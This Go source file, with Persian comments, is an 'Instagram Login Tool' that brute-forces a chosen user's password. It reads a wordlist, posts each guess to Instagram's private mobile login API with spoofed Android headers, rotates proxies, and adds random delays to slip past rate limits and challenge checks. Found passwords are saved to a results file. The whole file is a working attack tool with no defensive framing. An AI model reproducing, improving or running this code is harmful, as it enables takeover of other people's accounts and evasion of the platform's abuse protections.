package main

import (
	"bufio"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	API_URL        = "https://i.instagram.com/api/v1/"
	USER_AGENT     = "Instagram 76.0.0.15.395 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 138226743)"
	IG_SIG_KEY     = "4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
	IG_SIG_VERSION = "4"
	MAX_RETRIES    = 3
	TIMEOUT        = 10 * time.Second
)

type InstagramResponse struct {
	Status     string `json:"status"`
	Message    string `json:"message"`
	ErrorType  string `json:"error_type"`
	ErrorTitle string `json:"error_title"`
}

type LoginSession struct {
	Username     string
	ProxyList    []string
	CurrentProxy int
	mutex        sync.Mutex
}

func main() {
	// تنظیم لاگ
	setupLogging()

	// خواندن پروکسی‌ها
	proxies := loadProxies()
	
	session := &LoginSession{
		ProxyList: proxies,
	}

	fmt.Println("=== Instagram Login Tool ===")
	fmt.Printf("Current Time (UTC): %s\n", time.Now().UTC().Format("2006-01-02 15:04:05"))
	fmt.Printf("User: %s\n\n", "monsmain")

	fmt.Print("Enter Instagram username: ")
	fmt.Scanln(&session.Username)

	// خواندن پسوردها از فایل
	passwords := loadPasswords()
	if len(passwords) == 0 {
		log.Fatal("No passwords loaded from file!")
	}

	fmt.Printf("\nLoaded %d passwords and %d proxies\n", len(passwords), len(proxies))
	fmt.Println("\nStarting login attempts...\n")

	// شروع تلاش‌های لاگین
	successFound := false
	for i, password := range passwords {
		if successFound {
			break
		}

		fmt.Printf("[%d/%d] Testing password: %s\n", i+1, len(passwords), maskPassword(password))
		
		for retry := 0; retry < MAX_RETRIES; retry++ {
			success, shouldContinue := session.tryInstagramLogin(password)
			
			if success {
				successFound = true
				saveResult(session.Username, password, true)
				fmt.Printf("\n✅ Password found!\nUsername: %s\nPassword: %s\n", session.Username, password)
				break
			}

			if !shouldContinue {
				break
			}

			if retry < MAX_RETRIES-1 {
				sleepTime := time.Duration(rand.Intn(5)+3) * time.Second
				fmt.Printf("Retrying in %v seconds...\n", sleepTime.Seconds())
				time.Sleep(sleepTime)
			}
		}

		if !successFound {
			// فاصله زمانی تصادفی بین درخواست‌ها
			sleepTime := time.Duration(rand.Intn(4)+2) * time.Second
			time.Sleep(sleepTime)
		}
	}

	if !successFound {
		fmt.Println("\n❌ No valid password found!")
		saveResult(session.Username, "", false)
	}
}

func (s *LoginSession) getNextProxy() string {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	
	if len(s.ProxyList) == 0 {
		return ""
	}

	proxy := s.ProxyList[s.CurrentProxy]
	s.CurrentProxy = (s.CurrentProxy + 1) % len(s.ProxyList)
	return proxy
}

func (s *LoginSession) tryInstagramLogin(password string) (bool, bool) {
	loginUrl := API_URL + "accounts/login/"
	
	// ساخت داده‌های درخواست
	data := url.Values{}
	data.Set("username", s.Username)
	data.Set("password", password)
	data.Set("device_id", generateDeviceId())
	data.Set("login_attempt_count", "0")

	// ایجاد درخواست
	req, err := http.NewRequest("POST", loginUrl, strings.NewReader(data.Encode()))
	if err != nil {
		log.Printf("Error creating request: %v\n", err)
		return false, true
	}

	// تنظیم هدرها
	setHeaders(req)

	// تنظیم پروکسی
	client := &http.Client{
		Timeout: TIMEOUT,
	}
	
	if proxy := s.getNextProxy(); proxy != "" {
		proxyURL, err := url.Parse(proxy)
		if err == nil {
			client.Transport = &http.Transport{
				Proxy: http.ProxyURL(proxyURL),
			}
		}
	}

	// ارسال درخواست
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("Error sending request: %v\n", err)
		return false, true
	}
	defer resp.Body.Close()

	// خواندن پاسخ
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Printf("Error reading response: %v\n", err)
		return false, true
	}

	// پردازش پاسخ
	var response InstagramResponse
	if err := json.Unmarshal(body, &response); err != nil {
		log.Printf("Error parsing response: %v\n", err)
		return false, true
	}

	// بررسی وضعیت‌های مختلف
	switch {
	case response.Status == "ok":
		return true, true
	case response.ErrorType == "bad_password":
		return false, true
	case response.ErrorType == "rate_limit_error":
		fmt.Println("Rate limit reached. Waiting...")
		time.Sleep(5 * time.Second)
		return false, true
	case response.ErrorType == "checkpoint_challenge_required":
		fmt.Println("Challenge required. Switching proxy...")
		return false, true
	default:
		log.Printf("Unknown response status: %v\n", response.Status)
		return false, true
	}
}

func setHeaders(req *http.Request) {
	headers := map[string]string{
		"User-Agent":                    USER_AGENT,
		"Accept":                        "*/*",
		"Accept-Language":               "en-US",
		"Accept-Encoding":               "gzip, deflate, br",
		"X-IG-Capabilities":             "3brTvw==",
		"X-IG-Connection-Type":          "WIFI",
		"X-IG-Connection-Speed":         "-1kbps",
		"X-IG-App-ID":                  "567067343352427",
		"X-IG-Bandwidth-Speed-KBPS":    "-1.000",
		"X-IG-Bandwidth-TotalBytes-B":   "0",
		"X-IG-Bandwidth-TotalTime-MS":   "0",
		"X-IG-ABR-Connection-Speed-KBPS": "0",
		"Content-Type":                  "application/x-www-form-urlencoded; charset=UTF-8",
	}

	for key, value := range headers {
		req.Header.Set(key, value)
	}
}

func generateDeviceId() string {
	timestamp := time.Now().UnixNano()
	randomStr := fmt.Sprintf("%d%d", timestamp, rand.Intn(1000))
	return fmt.Sprintf("android-%s", randomStr)
}

func loadProxies() []string {
	proxies := []string{}
	
	file, err := os.Open("proxies.txt")
	if err == nil {
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			proxy := strings.TrimSpace(scanner.Text())
			if proxy != "" {
				proxies = append(proxies, proxy)
			}
		}
	}

	return proxies
}

func loadPasswords() []string {
	file, err := os.Open("password.txt")
	if err != nil {
		log.Printf("Error opening password file: %v", err)
		return []string{}
	}
	defer file.Close()

	var passwords []string
	scanner := bufio.NewScanner(file)
	
	for scanner.Scan() {
		pass := strings.TrimSpace(scanner.Text())
		if pass != "" {
			passwords = append(passwords, pass)
		}
	}

	return passwords
}

func setupLogging() {
	logFile, err := os.OpenFile("debug.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}
	log.SetOutput(logFile)
}

func saveResult(username, password string, success bool) {
	currentTime := time.Now().UTC().Format("2006-01-02 15:04:05")
	status := "Success"
	if !success {
		status = "Failed"
	}
	
	logEntry := fmt.Sprintf("[%s] %s - Username: %s, Password: %s\n", 
		currentTime, status, username, password)
	
	file, err := os.OpenFile("results.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("Error saving result: %v", err)
		return
	}
	defer file.Close()

	if _, err := file.WriteString(logEntry); err != nil {
		log.Printf("Error writing result: %v", err)
	}
}

func maskPassword(password string) string {
	if len(password) <= 4 {
		return "****"
	}
	return password[:2] + strings.Repeat("*", len(password)-4) + password[len(password)-2:]
}
